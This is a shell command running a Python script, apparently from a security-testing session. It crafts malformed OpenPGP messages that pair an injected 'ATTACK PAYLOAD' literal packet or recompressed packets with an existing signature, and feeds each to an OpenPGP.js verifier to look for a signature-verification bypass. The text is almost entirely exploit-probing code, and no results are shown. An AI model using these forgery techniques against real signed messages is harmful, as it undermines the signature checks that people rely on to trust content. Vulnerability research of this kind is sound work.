cd /tmp/pgptest && python3 << 'EOF'
import base64, struct, zlib, subprocess

def crc24(data):
    crc = 0xB704CE
    for b in data:
        crc ^= b << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF

def read_armor(path):
    lines = open(path).read().splitlines()
    body = [l for l in lines if l and not l.startswith('-----')]
    return base64.b64decode(''.join(body[:-1]))

def armor(raw, label='PGP MESSAGE'):
    b64 = base64.b64encode(raw).decode()
    out = f'-----BEGIN {label}-----\n\n'
    for i in range(0, len(b64), 64):
        out += b64[i:i+64] + '\n'
    out += '=' + base64.b64encode(crc24(raw).to_bytes(3,'big')).decode() + '\n'
    out += f'-----END {label}-----\n'
    return out

def parse(raw):
    packets = []
    i = 0
    while i < len(raw):
        start = i
        tag = raw[i] & 0x3f
        lnb = raw[i+1]
        if lnb < 192: ln, hdr = lnb, 2
        elif lnb < 224: ln, hdr = ((lnb-192)<<8) + raw[i+2] + 192, 3
        elif lnb == 255: ln, hdr = struct.unpack('>I', raw[i+2:i+6])[0], 6
        else: raise Exception('partial')
        full = raw[start:i+hdr+ln]
        body = raw[i+hdr:i+hdr+ln]
        packets.append((tag, full, body))
        i += hdr+ln
    return packets

def new_packet(tag, body):
    ln = len(body)
    if ln < 192: hdr = bytes([0xC0|tag, ln])
    elif ln < 8384:
        v = ln-192; hdr = bytes([0xC0|tag, 192+(v>>8), v&0xff])
    else: hdr = bytes([0xC0|tag,255]) + struct.pack('>I', ln)
    return hdr+body

def literal_packet(data, fmt=0x62, date=0x6a9bb427, filename=b''):
    return new_packet(11, bytes([fmt, len(filename)]) + filename + struct.pack('>I', date) + data)

def compressed_packet(inner_raw, algo=1):
    comp = zlib.compress(inner_raw)[2:-4]
    return new_packet(8, bytes([algo]) + comp)

raw = read_armor('signed.asc')
pkts = parse(raw)
ops = pkts[0][1]; lit = pkts[1]; sig = pkts[2][1]
litbody = lit[2]; fmt = litbody[0]; date = struct.unpack('>I', litbody[4:8])[0]; base_data = litbody[6:]
payload = b'ATTACK PAYLOAD INJECTED 12345'
mylit = literal_packet(payload, fmt=fmt, date=date)

cands = {
 'c8_comp_baseline_only': ops + compressed_packet(lit[1]) + sig,
 'c9_baseline_then_comp_baseline': ops + lit[1] + compressed_packet(lit[1]) + sig,
 'c10_comp_payload_only': ops + compressed_packet(mylit) + sig,
 'c11_payload_then_comp_baseline': ops + mylit + compressed_packet(lit[1]) + sig,
}
for name, msgraw in cands.items():
    open(f'{name}.asc','w').write(armor(msgraw))
    r = subprocess.run(['/workspace/artifacts/target/openpgpjs','verify','--message',f'{name}.asc','--key','test-public.asc'], capture_output=True, text=True)
    print('===', name, '===')
    print(r.stdout.strip())
    print()
EOF

